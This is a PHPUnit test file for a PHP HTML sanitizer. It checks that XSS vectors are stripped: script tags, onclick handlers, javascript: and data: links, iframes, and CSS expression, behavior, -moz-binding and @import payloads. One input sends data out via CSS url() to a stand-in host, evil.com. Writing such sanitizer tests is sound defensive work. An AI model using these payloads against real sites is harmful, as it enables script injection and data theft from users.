<?php

namespace Tests\Unit;

use App\Services\HtmlSanitizer;
use PHPUnit\Framework\TestCase;

class HtmlSanitizerTest extends TestCase
{
    private HtmlSanitizer $s;

    protected function setUp(): void
    {
        $this->s = new HtmlSanitizer();
    }

    public function test_null_returns_null(): void
    {
        $this->assertNull($this->s->sanitize(null));
    }

    public function test_empty_string_returns_empty(): void
    {
        $this->assertSame('', $this->s->sanitize(''));
    }

    public function test_plain_text_passes_through(): void
    {
        $out = $this->s->sanitize('<p>Hello world</p>');
        $this->assertStringContainsString('Hello world', $out);
    }

    public function test_allowed_tags_preserved(): void
    {
        $html = '<p><strong>Bold</strong> and <em>italic</em></p>';
        $out  = $this->s->sanitize($html);
        $this->assertStringContainsString('<strong>Bold</strong>', $out);
        $this->assertStringContainsString('<em>italic</em>', $out);
    }

    public function test_script_tag_stripped(): void
    {
        $out = $this->s->sanitize('<p>Hello</p><script>alert(1)</script>');
        $this->assertStringNotContainsString('<script>', $out);
        $this->assertStringNotContainsString('alert(1)', $out);
    }

    public function test_on_event_handler_stripped(): void
    {
        $out = $this->s->sanitize('<p onclick="alert(1)">Click</p>');
        $this->assertStringNotContainsString('onclick', $out);
        $this->assertStringContainsString('Click', $out);
    }

    public function test_javascript_href_stripped(): void
    {
        $out = $this->s->sanitize('<a href="javascript:alert(1)">link</a>');
        $this->assertStringNotContainsString('javascript:', $out);
        $this->assertStringContainsString('link', $out);
    }

    public function test_data_uri_href_stripped(): void
    {
        $out = $this->s->sanitize('<a href="data:text/html,<script>alert(1)</script>">x</a>');
        $this->assertStringNotContainsString('data:', $out);
    }

    public function test_safe_href_preserved(): void
    {
        $out = $this->s->sanitize('<a href="https://example.com" title="ex" rel="noopener">link</a>');
        $this->assertStringContainsString('href="https://example.com"', $out);
    }

    public function test_css_url_exfiltration_blocked(): void
    {
        $out = $this->s->sanitize('<p style="background:url(https://evil.com/?c=x)">text</p>');
        $this->assertStringNotContainsString('style=', $out);
        $this->assertStringContainsString('text', $out);
    }

    public function test_css_expression_blocked(): void
    {
        $out = $this->s->sanitize('<p style="width:expression(alert(1))">text</p>');
        $this->assertStringNotContainsString('style=', $out);
        $this->assertStringContainsString('text', $out);
    }

    public function test_css_behavior_blocked(): void
    {
        $out = $this->s->sanitize('<p style="behavior:url(evil.htc)">text</p>');
        $this->assertStringNotContainsString('style=', $out);
        $this->assertStringContainsString('text', $out);
    }

    public function test_css_position_fixed_blocked(): void
    {
        $out = $this->s->sanitize('<div style="position:fixed;top:0;width:100%">overlay</div>');
        $this->assertStringNotContainsString('style=', $out);
        $this->assertStringContainsString('overlay', $out);
    }

    public function test_disallowed_attribute_stripped(): void
    {
        $out = $this->s->sanitize('<p data-evil="x" class="ok">text</p>');
        $this->assertStringNotContainsString('data-evil', $out);
        $this->assertStringContainsString('class="ok"', $out);
    }

    public function test_iframe_stripped(): void
    {
        $out = $this->s->sanitize('<iframe src="https://evil.com"></iframe><p>safe</p>');
        $this->assertStringNotContainsString('<iframe', $out);
        $this->assertStringContainsString('safe', $out);
    }

    public function test_nested_disallowed_tag_stripped(): void
    {
        $out = $this->s->sanitize('<p>Text <object data="evil.swf"></object></p>');
        $this->assertStringNotContainsString('<object', $out);
        $this->assertStringContainsString('Text', $out);
    }

    public function test_img_allowed_attrs_preserved(): void
    {
        $out = $this->s->sanitize('<img src="photo.jpg" alt="Photo" width="100">');
        $this->assertStringContainsString('src="photo.jpg"', $out);
        $this->assertStringContainsString('alt="Photo"', $out);
        $this->assertStringContainsString('width="100"', $out);
    }

    public function test_whitespace_only_returns_whitespace(): void
    {
        $this->assertSame('   ', $this->s->sanitize('   '));
    }

    public function test_css_moz_binding_blocked(): void
    {
        $out = $this->s->sanitize('<p style="-moz-binding:url(evil.xml#xss)">text</p>');
        $this->assertStringNotContainsString('style=', $out);
    }

    public function test_css_import_in_style_blocked(): void
    {
        $out = $this->s->sanitize('<p style="@import url(evil.css)">text</p>');
        $this->assertStringNotContainsString('style=', $out);
    }
}
